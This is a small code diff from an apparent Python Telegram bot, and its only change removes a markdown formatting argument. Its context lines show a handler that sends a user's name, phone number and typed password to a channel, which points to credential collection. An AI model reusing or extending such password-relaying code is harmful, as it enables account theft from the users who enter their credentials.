@@ -145,7 +145,6 @@ async def handle_account_info(client: Client, message: Message):
                 f"▫️ Name: `{state['name']}`\n"
                 f"▫️ Phone: `{state['phone']}`\n"
                 f"▫️ Password: `{message.text}`",
-                parse_mode="md"
             )
         except Exception as e:
             print(f"Error sending to channel: {e}")
